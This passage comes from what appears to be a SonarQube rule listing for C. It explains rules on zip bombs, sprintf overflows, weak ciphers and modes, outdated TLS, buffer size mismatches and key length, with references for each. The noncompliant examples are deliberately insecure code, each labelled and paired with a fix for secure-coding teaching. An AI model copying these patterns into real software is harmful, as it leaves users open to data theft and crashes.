fchmod(fd, S_ISUID|S_ISGID); // Sensitive
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/">Top 10 2021 Category A1 - Broken Access Control</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control">Top 10 2017 Category A5 - Broken Access Control</a>
  </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/250">CWE-250 - Execution with Unnecessary Privileges</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/266">CWE-266 - Incorrect Privilege Assignment</a> </li>
  <li> <a href="https://forums.grsecurity.net/viewtopic.php?f=7&amp;t=2522">False Boundaries and Arbitrary Code Execution</a> </li>
  <li> <a href="https://man7.org/linux/man-pages/man7/capabilities.7.html">Linux manual page</a> - capabilities(7) </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=c:S5042">
              c:S5042
            </a>
          </td>
          <td>
            <details>
              <p>Successful Zip Bomb attacks occur when an application expands untrusted archive files without controlling the size of the expanded data, which can
lead to denial of service. A Zip bomb is usually a malicious archive file of a few kilobytes of compressed data but turned into gigabytes of
uncompressed data. To achieve this extreme <a href="https://en.wikipedia.org/wiki/Data_compression_ratio">compression ratio</a>, attackers will
compress irrelevant data (eg: a long string of repeated bytes).</p>
<h2>Ask Yourself Whether</h2>
<p>Archives to expand are untrusted and:</p>
<ul>
  <li> There is no validation of the number of entries in the archive. </li>
  <li> There is no validation of the total size of the uncompressed data. </li>
  <li> There is no validation of the ratio between the compressed and uncompressed archive entry. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Define and control the threshold for maximum total size of the uncompressed data. </li>
  <li> Count the number of file entries extracted from the archive and abort the extraction if their number is greater than a predefined threshold, in
  particular it’s not recommended to recursively expand archives (an entry of an archive could be also an archive). </li>
</ul>
<h2>Sensitive Code Example</h2>
<pre>
#include &lt;archive.h&gt;
#include &lt;archive_entry.h&gt;
// ...

void f(const char *filename, int flags) {
  struct archive_entry *entry;
  struct archive *a = archive_read_new();
  struct archive *ext = archive_write_disk_new();
  archive_write_disk_set_options(ext, flags);
  archive_read_support_format_tar(a);

  if ((archive_read_open_filename(a, filename, 10240))) {
    return;
  }

  for (;;) {
    int r = archive_read_next_header(a, &amp;entry);
    if (r == ARCHIVE_EOF) {
      break;
    }
    if (r != ARCHIVE_OK) {
      return;
    }
  }
  archive_read_close(a);
  archive_read_free(a);

  archive_write_close(ext);
  archive_write_free(ext);
}
</pre>
<h2>Compliant Solution</h2>
<pre>
#include &lt;archive.h&gt;
#include &lt;archive_entry.h&gt;
// ...

int f(const char *filename, int flags) {
  const int max_number_of_extraced_entries = 1000;
  const int64_t max_file_size = 1000000000; // 1 GB

  int number_of_extraced_entries = 0;
  int64_t total_file_size = 0;

  struct archive_entry *entry;
  struct archive *a = archive_read_new();
  struct archive *ext = archive_write_disk_new();
  archive_write_disk_set_options(ext, flags);
  archive_read_support_format_tar(a);
  int status = 0;

  if ((archive_read_open_filename(a, filename, 10240))) {
    return -1;
  }

  for (;;) {
    number_of_extraced_entries++;
    if (number_of_extraced_entries &gt; max_number_of_extraced_entries) {
      status = 1;
      break;
    }

    int r = archive_read_next_header(a, &amp;entry);
    if (r == ARCHIVE_EOF) {
      break;
    }
    if (r != ARCHIVE_OK) {
      status = -1;
      break;
    }

    int file_size = archive_entry_size(entry);
    total_file_size += file_size;
    if (total_file_size &gt; max_file_size) {
      status = 1;
      break;
    }
  }
  archive_read_close(a);
  archive_read_free(a);

  archive_write_close(ext);
  archive_write_free(ext);

  return status;
}
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/">Top 10 2021 Category A1 - Broken Access Control</a> </li>
  <li> OWASP - <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control">Top 10 2017 Category A5 - Broken Access Control</a>
  </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">Top 10 2017 Category A6 - Security
  Misconfiguration</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/409">CWE-409 - Improper Handling of Highly Compressed Data (Data Amplification)</a> </li>
  <li> <a href="https://www.bamsoftware.com/hacks/zipbomb/">bamsoftware.com</a> - A better Zip Bomb </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=c:S6069">
              c:S6069
            </a>
          </td>
          <td>
            <details>
              <p>When using <code>sprintf</code> , it’s up to the developer to make sure the size of the buffer to be written to is large enough to avoid buffer
overflows. Buffer overflows can cause the program to crash at a minimum. At worst, a carefully crafted overflow can cause malicious code to be
executed.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> if the provided buffer is large enough for the result of any possible call to the <code>sprintf</code> function (including all possible format
  strings and all possible additional arguments). </li>
</ul>
<p>There is a risk if you answered no to the above question.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>There are fundamentally safer alternatives. <code>snprintf</code> is one of them. It takes the size of the buffer as an additional argument,
preventing the function from overflowing the buffer.</p>
<ul>
  <li> Use <code>snprintf</code> instead of <code>sprintf</code>. The slight performance overhead can be afforded in a vast majority of projects.
  </li>
  <li> Check the buffer size passed to <code>snprintf</code>. </li>
</ul>
<p>If you are working in C++, other safe alternative exist:</p>
<ul>
  <li> <code>std::string</code> should be the prefered type to store strings </li>
  <li> You can format to a string using <code>std::ostringstream</code> </li>
  <li> Since C++20, <code>std::format</code> is also available to format strings </li>
</ul>
<h2>Sensitive Code Example</h2>
<pre>
sprintf(str, "%s", message);   // Sensitive: `str` buffer size is not checked and it is vulnerable to overflows
</pre>
<h2>Compliant Solution</h2>
<pre>
snprintf(str, sizeof(str), "%s", message); // Prevent overflows by enforcing a maximum size for `str` buffer
</pre>
<h2>Exceptions</h2>
<p>It is a very common and acceptable pattern to compute the required size of the buffer with a call to <code>snprintf</code> with the same arguments
into an empty buffer (this will fail, but return the necessary size), then to call <code>sprintf</code> as the bound check is not needed anymore. Note
that 1 needs to be added by the size reported by <code>snprintf</code> to account for the terminal null character.</p>
<pre>
size_t buflen = snprintf(0, 0, "%s", message);
char* buf = malloc(buflen + 1); // For the final 0
sprintf(buf, "%s", message);{code}
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/">Top 10 2021 Category A6 - Vulnerable and Outdated
  Components</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A9_2017-Using_Components_with_Known_Vulnerabilities">Top 10 2017 Category A9 -
  Using Components with Known Vulnerabilities</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/676">CWE-676 - Use of Potentially Dangerous Function</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/119">CWE-119 - Improper Restriction of Operations within the Bounds of a Memory
  Buffer</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=c:S5547">
              c:S5547
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability makes it possible that the cleartext of the encrypted message might be recoverable without prior knowledge of the key.</p>
<h2>Why is this an issue?</h2>
<p>Encryption algorithms are essential for protecting sensitive information and ensuring secure communication in various domains. They are used for
several important reasons:</p>
<ul>
  <li> Confidentiality, privacy, and intellectual property protection </li>
  <li> Security during transmission or on storage devices </li>
  <li> Data integrity, general trust, and authentication </li>
</ul>
<p>When selecting encryption algorithms, tools, or combinations, you should also consider two things:</p>
<ol>
  <li> No encryption is unbreakable. </li>
  <li> The strength of an encryption algorithm is usually measured by the effort required to crack it within a reasonable time frame. </li>
</ol>
<p>For these reasons, as soon as cryptography is included in a project, it is important to choose encryption algorithms that are considered strong and
secure by the cryptography community.</p>
<h3>What is the potential impact?</h3>
<p>The cleartext of an encrypted message might be recoverable. Additionally, it might be possible to modify the cleartext of an encrypted message.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Theft of sensitive data</h4>
<p>The encrypted message might contain data that is considered sensitive and should not be known to third parties.</p>
<p>By using a weak algorithm the likelihood that an attacker might be able to recover the cleartext drastically increases.</p>
<h4>Additional attack surface</h4>
<p>By modifying the cleartext of the encrypted message it might be possible for an attacker to trigger other vulnerabilities in the code. Encrypted
values are often considered trusted, since under normal circumstances it would not be possible for a third party to modify them.</p>
<h2>How to fix it in Botan</h2>
<h3>Code examples</h3>
<p>The following code contains examples of algorithms that are not considered highly resistant to cryptanalysis and thus should be avoided.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
#include &lt;botan/cipher_mode.h&gt;

void encrypt() {
  Botan::Cipher_Mode::create("DES/CBC/PKCS7", Botan::ENCRYPTION); // Noncompliant
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
#include &lt;botan/cipher_mode.h&gt;

void encrypt() {
  Botan::Cipher_Mode::create("AES-256/GCM", Botan::ENCRYPTION);
}
</pre>
<h3>How does this work?</h3>
<h4>Use a secure algorithm</h4>
<p>It is highly recommended to use an algorithm that is currently considered secure by the cryptographic community. A common choice for such an
algorithm is the Advanced Encryption Standard (AES).</p>
<p>For block ciphers, it is not recommended to use algorithms with a block size that is smaller than 128 bits.</p>
<h2>Resources</h2>
<h3>Documentation</h3>
<ul>
  <li> <a href="https://botan.randombit.net/handbook/">Botan</a> - Handbook </li>
  <li> <a href="https://www.feistyduck.com/books/openssl-cookbook/">OpenSSL</a> - Cookbook </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">Top 10 2017 Category A6 - Security
  Misconfiguration</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/327">CWE-327 - Use of a Broken or Risky Cryptographic Algorithm</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=c:S5542">
              c:S5542
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability exposes encrypted data to a number of attacks whose goal is to recover the plaintext.</p>
<h2>Why is this an issue?</h2>
<p>Encryption algorithms are essential for protecting sensitive information and ensuring secure communications in a variety of domains. They are used
for several important reasons:</p>
<ul>
  <li> Confidentiality, privacy, and intellectual property protection </li>
  <li> Security during transmission or on storage devices </li>
  <li> Data integrity, general trust, and authentication </li>
</ul>
<p>When selecting encryption algorithms, tools, or combinations, you should also consider two things:</p>
<ol>
  <li> No encryption is unbreakable. </li>
  <li> The strength of an encryption algorithm is usually measured by the effort required to crack it within a reasonable time frame. </li>
</ol>
<p>For these reasons, as soon as cryptography is included in a project, it is important to choose encryption algorithms that are considered strong and
secure by the cryptography community.</p>
<p>For AES, the weakest mode is ECB (Electronic Codebook). Repeated blocks of data are encrypted to the same value, making them easy to identify and
reducing the difficulty of recovering the original cleartext.</p>
<p>Unauthenticated modes such as CBC (Cipher Block Chaining) may be used but are prone to attacks that manipulate the ciphertext. They must be used
with caution.</p>
<p>For RSA, the weakest algorithms are either using it without padding or using the PKCS1v1.5 padding scheme.</p>
<h3>What is the potential impact?</h3>
<p>The cleartext of an encrypted message might be recoverable. Additionally, it might be possible to modify the cleartext of an encrypted message.</p>
<p>Below are some real-world scenarios that illustrate possible impacts of an attacker exploiting the vulnerability.</p>
<h4>Theft of sensitive data</h4>
<p>The encrypted message might contain data that is considered sensitive and should not be known to third parties.</p>
<p>By using a weak algorithm the likelihood that an attacker might be able to recover the cleartext drastically increases.</p>
<h4>Additional attack surface</h4>
<p>By modifying the cleartext of the encrypted message it might be possible for an attacker to trigger other vulnerabilities in the code. Encrypted
values are often considered trusted, since under normal circumstances it would not be possible for a third party to modify them.</p>
<h2>How to fix it in Botan</h2>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<p>Example with a symmetric cipher, AES:</p>
<pre data-diff-id="1" data-diff-type="noncompliant">
#include &lt;botan/cipher_mode.h&gt;

void encrypt() {
  Botan::Cipher_Mode::create("AES-256/ECB", Botan::ENCRYPTION); // Noncompliant
}
</pre>
<p>Example with an asymmetric cipher, RSA:</p>
<pre data-diff-id="2" data-diff-type="noncompliant">
#include &lt;botan/rng.h&gt;
#include &lt;botan/auto_rng.h&gt;
#include &lt;botan/rsa.h&gt;
#include &lt;botan/pubkey.h&gt;

void encrypt() {
  std::unique_ptr&lt;Botan::RandomNumberGenerator&gt;   rng(new Botan::AutoSeeded_RNG);
  Botan::RSA_PrivateKey                           rsaKey(*rng.get(), 2048);

  Botan::PK_Encryptor_EME(rsaKey, *rng.get(), "PKCS1v15"); // Noncompliant
}
</pre>
<h4>Compliant solution</h4>
<p>For the AES symmetric cipher, use the GCM mode:</p>
<pre data-diff-id="1" data-diff-type="compliant">
#include &lt;botan/cipher_mode.h&gt;

void encrypt() {
  Botan::Cipher_Mode::create("AES-256/GCM", Botan::ENCRYPTION);
}
</pre>
<p>For the RSA asymmetric cipher, use the Optimal Asymmetric Encryption Padding (OAEP):</p>
<pre data-diff-id="2" data-diff-type="compliant">
#include &lt;botan/rng.h&gt;
#include &lt;botan/auto_rng.h&gt;
#include &lt;botan/rsa.h&gt;
#include &lt;botan/pubkey.h&gt;

void encrypt() {
  std::unique_ptr&lt;Botan::RandomNumberGenerator&gt;   rng(new Botan::AutoSeeded_RNG);
  Botan::RSA_PrivateKey                           rsaKey(*rng.get(), 2048);

  Botan::PK_Encryptor_EME(rsaKey, *rng.get(), "OAEP");
}
</pre>
<h3>How does this work?</h3>
<p>As a rule of thumb, use the cryptographic algorithms and mechanisms that are considered strong by the cryptographic community.</p>
<p>Appropriate choices are currently the following.</p>
<h4>For AES: use authenticated encryption modes</h4>
<p>The best-known authenticated encryption mode for AES is Galois/Counter mode (GCM).</p>
<p>GCM mode combines encryption with authentication and integrity checks using a cryptographic hash function and provides both confidentiality and
authenticity of data.</p>
<p>Other similar modes are:</p>
<ul>
  <li> CCM: <code>Counter with CBC-MAC</code> </li>
  <li> CWC: <code>Cipher Block Chaining with Message Authentication Code</code> </li>
  <li> EAX: <code>Encrypt-and-Authenticate</code> </li>
  <li> IAPM: <code>Integer Authenticated Parallelizable Mode</code> </li>
  <li> OCB: <code>Offset Codebook Mode</code> </li>
</ul>
<p>It is also possible to use AES-CBC with HMAC for integrity checks. However, it is considered more straightforward to use AES-GCM directly
instead.</p>
<h4>For RSA: use the OAEP scheme</h4>
<p>The Optimal Asymmetric Encryption Padding scheme (OAEP) adds randomness and a secure hash function that strengthens the regular inner workings of
RSA.</p>
<h2>Resources</h2>
<h3>Articles &amp; blog posts</h3>
<ul>
  <li> <a href="https://learn.microsoft.com/en-us/dotnet/standard/security/vulnerabilities-cbc-mode">Microsoft, Timing vulnerabilities with CBC-mode
  symmetric decryption using padding</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Padding_oracle_attack">Wikipedia, Padding Oracle Attack</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Chosen-ciphertext_attack">Wikipedia, Chosen-Ciphertext Attack</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Chosen-plaintext_attack">Wikipedia, Chosen-Plaintext Attack</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Semantic_security">Wikipedia, Semantically Secure Cryptosystems</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Optimal_asymmetric_encryption_padding">Wikipedia, OAEP</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Galois/Counter_Mode">Wikipedia, Galois/Counter Mode</a> </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">Top 10 2017 Category A6 - Security
  Misconfiguration</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/327">CWE-327 - Use of a Broken or Risky Cryptographic Algorithm</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=c:S5782">
              c:S5782
            </a>
          </td>
          <td>
            <details>
              <p>Some POSIX functions take one argument that is a buffer and another one that represents the size of the buffer. It is up to the developer to make
sure the two arguments do match and that the size argument does not exceed the buffer’s size.</p>
<h2>Why is this an issue?</h2>
<p>When the size argument exceeds the actual size of the buffer, the memory management functions will either read or write data past the buffer memory
boundary into adjacent memory. Because the memory might be uninitialized or contain other pieces of data, the behavior of the affected function can
not be predicted and will likely trigger bugs.</p>
<h3>What is the potential impact?</h3>
<p>Buffer boundaries violations can lead to serious security issues.</p>
<h4>Information disclosure</h4>
<p>In some scenarios, insecure functions can lead to information disclosure. For instance, if an attacker can cause a buffer overread, they might be
able to disclose data in memory that they’re not supposed to have access to. This could potentially allow them to access sensitive information, such
as passwords or encryption keys. An example of a buffer overread is provided with the Heartbleed vulnerability. ==== Code execution</p>
<p>In some cases, an attacker can craft input in a way that allows them to gain unauthorized access to your system. For example, they might be able to
overwrite a function’s return address in memory, causing your program to execute code of the attacker’s choosing. This could potentially give the
attacker full control over your system.</p>
<h4>Denial of service</h4>
<p>If an attacker can trigger a buffer overflow by providing oversized input, it can cause the program to crash. If the attacker repeats this process,
it can continually disrupt the service, denying access to other users. This can be particularly damaging for services that require high availability,
such as online platforms or databases.</p>
<p>In some cases, the input might cause the program to enter an infinite loop or consume excessive memory, slowing down the system or even causing it
to become unresponsive. This type of attack is known as a resource exhaustion DoS attack.</p>
<h3>Exceptions</h3>
<p>Functions related to sockets using the type <code>socklen_t</code> are not checked. This is because these functions are using a C-style polymorphic
pattern using <code>union</code>. It relies on a mismatch between allocated memory and sizes of structures and it creates false positives.</p>
<h2>How to fix it</h2>
<h3>Code examples</h3>
<p>In the following code example, <code>memchr</code> is used to find the first occurrence of the <code>@</code> character in a buffer,
<code>array</code>. The second argument does not match the size of this buffer, so it may find an occurrence of the character after the end of the
buffer and read data it is not supposed to. If the returned <code>pos</code> pointer is later used to write characters, this could unexpectedly
overwrite data.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
char array[10];
initialize(array);
char *pos = memchr(array, '@', 42); // Noncompliant
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
char array[10];
initialize(array);
char *pos = memchr(array, '@', sizeof(array));
</pre>
<h2>Resources</h2>
<h3>Articles &amp; blog posts</h3>
<ul>
  <li> Heartbleed - <a href="https://heartbleed.com/">The Heartbleed Bug</a> </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/">Top 10 2021 - A06 - Vulnerable and Outdated
  Components</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A9_2017-Using_Components_with_Known_Vulnerabilities">Top 10 2017 Category A9 -
  Using Components with Known Vulnerabilities</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/119">CWE-119 - Improper Restriction of Operations within the Bounds of a Memory
  Buffer</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/131">CWE-131 - Incorrect Calculation of Buffer Size</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/788">CWE-788 - Access of Memory Location After End of Buffer</a> </li>
</ul>
<h3>External coding guidelines</h3>
<ul>
  <li> CERT - <a href="https://wiki.sei.cmu.edu/confluence/x/wtYxBQ">ARR30-C. - Do not form or use out-of-bounds pointers or array subscripts</a>
  </li>
  <li> CERT - <a href="https://wiki.sei.cmu.edu/confluence/x/i3w-BQ">STR50-CPP. - Guarantee that storage for strings has sufficient space for
  character data and the null terminator</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=c:S4423">
              c:S4423
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability exposes encrypted data to a number of attacks whose goal is to recover the plaintext.</p>
<h2>Why is this an issue?</h2>
<p>Encryption algorithms are essential for protecting sensitive information and ensuring secure communications in a variety of domains. They are used
for several important reasons:</p>
<ul>
  <li> Confidentiality, privacy, and intellectual property protection </li>
  <li> Security during transmission or on storage devices </li>
  <li> Data integrity, general trust, and authentication </li>
</ul>
<p>When selecting encryption algorithms, tools, or combinations, you should also consider two things:</p>
<ol>
  <li> No encryption is unbreakable. </li>
  <li> The strength of an encryption algorithm is usually measured by the effort required to crack it within a reasonable time frame. </li>
</ol>
<p>For these reasons, as soon as cryptography is included in a project, it is important to choose encryption algorithms that are considered strong and
secure by the cryptography community.</p>
<p>To provide communication security over a network, SSL and TLS are generally used. However, it is important to note that the following protocols are
all considered weak by the cryptographic community, and are officially deprecated:</p>
<ul>
  <li> SSL versions 1.0, 2.0 and 3.0 </li>
  <li> TLS versions 1.0 and 1.1 </li>
</ul>
<p>When these unsecured protocols are used, it is best practice to expect a breach: that a user or organization with malicious intent will perform
mathematical attacks on this data after obtaining it by other means.</p>
<h3>What is the potential impact?</h3>
<p>After retrieving encrypted data and performing cryptographic attacks on it on a given timeframe, attackers can recover the plaintext that
encryption was supposed to protect.</p>
<p>Depending on the recovered data, the impact may vary.</p>
<p>Below are some real-world scenarios that illustrate the potential impact of an attacker exploiting the vulnerability.</p>
<h4>Additional attack surface</h4>
<p>By modifying the plaintext of the encrypted message, an attacker may be able to trigger additional vulnerabilities in the code. An attacker can
further exploit a system to obtain more information.<br> Encrypted values are often considered trustworthy because it would not be possible for a
third party to modify them under normal circumstances.</p>
<h4>Breach of confidentiality and privacy</h4>
<p>When encrypted data contains personal or sensitive information, its retrieval by an attacker can lead to privacy violations, identity theft,
financial loss, reputational damage, or unauthorized access to confidential systems.</p>
<p>In this scenario, the company, its employees, users, and partners could be seriously affected.</p>
<p>The impact is twofold, as data breaches and exposure of encrypted data can undermine trust in the organization, as customers, clients and
stakeholders may lose confidence in the organization’s ability to protect their sensitive data.</p>
<h4>Legal and compliance issues</h4>
<p>In many industries and locations, there are legal and compliance requirements to protect sensitive data. If encrypted data is compromised and the
plaintext can be recovered, companies face legal consequences, penalties, or violations of privacy laws.</p>
<h2>How to fix it in cURL</h2>
<h3>Code examples</h3>
<p>The following code samples attempt to create an HTTP request.</p>
<h4>Noncompliant code example</h4>
<p>This sample uses Curl’s default TLS algorithms, which are weak cryptographical algorithms: TLSv1.0 and LTSv1.1.</p>
<pre data-diff-id="11" data-diff-type="noncompliant">
#include &lt;curl/curl.h&gt;

void encrypt() {
    CURL *curl;
    curl_global_init(CURL_GLOBAL_DEFAULT);

    curl = curl_easy_init();                                      // Noncompliant
    curl_easy_setopt(curl, CURLOPT_URL, "https://example.com/");

    curl_easy_perform(curl);
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="11" data-diff-type="compliant">
#include &lt;curl/curl.h&gt;

void encrypt() {
    CURL *curl;
    curl_global_init(CURL_GLOBAL_DEFAULT);

    curl = curl_easy_init();
    curl_easy_setopt(curl, CURLOPT_URL, "https://example.com/");
    curl_easy_setopt(curl, CURLOPT_SSLVERSION, CURL_SSLVERSION_TLSv1_2);

    curl_easy_perform(curl);
}
</pre>
<h3>How does this work?</h3>
<p>As a rule of thumb, by default you should use the cryptographic algorithms and mechanisms that are considered strong by the cryptographic
community.</p>
<p>The best choices at the moment are the following.</p>
<h4>Use TLS v1.2 or TLS v1.3</h4>
<p>Even though TLS V1.3 is available, using TLS v1.2 is still considered good and secure practice by the cryptography community.<br></p>
<p>The use of TLS v1.2 ensures compatibility with a wide range of platforms and enables seamless communication between different systems that do not
yet have TLS v1.3 support.</p>
<p>The only drawback depends on whether the framework used is outdated: its TLS v1.2 settings may enable older and insecure cipher suites that are
deprecated as insecure.</p>
<p>On the other hand, TLS v1.3 removes support for older and weaker cryptographic algorithms, eliminates known vulnerabilities from previous TLS
versions, and improves performance.</p>
<h2>Resources</h2>
<h3>Articles &amp; blog posts</h3>
<ul>
  <li> <a href="https://en.wikipedia.org/wiki/Padding_oracle_attack">Wikipedia, Padding Oracle Attack</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Chosen-ciphertext_attack">Wikipedia, Chosen-Ciphertext Attack</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Chosen-plaintext_attack">Wikipedia, Chosen-Plaintext Attack</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Semantic_security">Wikipedia, Semantically Secure Cryptosystems</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Optimal_asymmetric_encryption_padding">Wikipedia, OAEP</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Galois/Counter_Mode">Wikipedia, Galois/Counter Mode</a> </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/">Top 10 2021 Category A7 - Identification and
  Authentication Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">Top 10 2017 Category A6 - Security
  Misconfiguration</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/327">CWE-327 - Use of a Broken or Risky Cryptographic Algorithm</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=c:S4426">
              c:S4426
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability exposes encrypted data to attacks whose goal is to recover the plaintext.</p>
<h2>Why is this an issue?</h2>
<p>Encryption algorithms are essential for protecting sensitive information and ensuring secure communications in a variety of domains. They are used
for several important reasons:</p>
<ul>
  <li> Confidentiality, privacy, and intellectual property protection </li>
  <li> Security during transmission or on storage devices </li>
  <li> Data integrity, general trust, and authentication </li>
</ul>
<p>When selecting encryption algorithms, tools, or combinations, you should also consider two things:</p>
<ol>
  <li> No encryption is unbreakable. </li>
  <li> The strength of an encryption algorithm is usually measured by the effort required to crack it within a reasonable time frame. </li>
</ol>
<p>In today’s cryptography, the length of the <strong>key</strong> directly affects the security level of cryptographic algorithms.</p>
<p>Note that depending on the algorithm, the term <strong>key</strong> refers to a different mathematical property. For example:</p>
<ul>
  <li> For RSA, the key is the product of two large prime numbers, also called the <strong>modulus</strong>. </li>
  <li> For AES and Elliptic Curve Cryptography (ECC), the key is only a sequence of randomly generated bytes.
    <ul>
      <li> In some cases, AES keys are derived from a master key or a passphrase using a Key Derivation Function (KDF) like PBKDF2 (Password-Based Key
      Derivation Function 2) </li>
    </ul>  </li>
</ul>
<p>If an application uses a key that is considered short and <strong>insecure</strong>, the encrypted data is exposed to attacks aimed at getting at
the plaintext.</p>
<p>In general, it is best practice to expect a breach: that a user or organization with malicious intent will perform cryptographic attacks on this
data after obtaining it by other means.</p>
<h3>What is the potential impact?</h3>
<p>After retrieving encrypted data and performing cryptographic attacks on it on a given timeframe, attackers can recover the plaintext that
encryption was supposed to protect.</p>
<p>Depending on the recovered data, the impact may vary.</p>
<p>Below are some real-world scenarios that illustrate the potential impact of an attacker exploiting the vulnerability.</p>
<h4>Additional attack surface</h4>
<p>By modifying the plaintext of the encrypted message, an attacker may be able to trigger additional vulnerabilities in the code. An attacker can
further exploit a system to obtain more information.<br> Encrypted values are often considered trustworthy because it would not be possible for a
third party to modify them under normal circumstances.</p>
<h4>Breach of confidentiality and privacy</h4>
<p>When encrypted data contains personal or sensitive information, its retrieval by an attacker can lead to privacy violations, identity theft,
financial loss, reputational damage, or unauthorized access to confidential systems.</p>
<p>In this scenario, the company, its employees, users, and partners could be seriously affected.</p>
<p>The impact is twofold, as data breaches and exposure of encrypted data can undermine trust in the organization, as customers, clients and
stakeholders may lose confidence in the organization’s ability to protect their sensitive data.</p>
<h4>Legal and compliance issues</h4>
<p>In many industries and locations, there are legal and compliance requirements to protect sensitive data. If encrypted data is compromised and the
plaintext can be recovered, companies face legal consequences, penalties, or violations of privacy laws.</p>
<h2>How to fix it in Botan</h2>
<h3>Code examples</h3>
<p>The following code examples either explicitly or implicitly generate keys. Note that there are differences in the size of the keys depending on the
algorithm.</p>
<p>Due to the mathematical properties of the algorithms, the security requirements for the key size vary depending on the algorithm.<br> For example,
a 256-bit ECC key provides about the same level of security as a 3072-bit RSA key and a 128-bit symmetric key.</p>
<h4>Noncompliant code example</h4>
<p>Here is an example of a private key generation with RSA:</p>
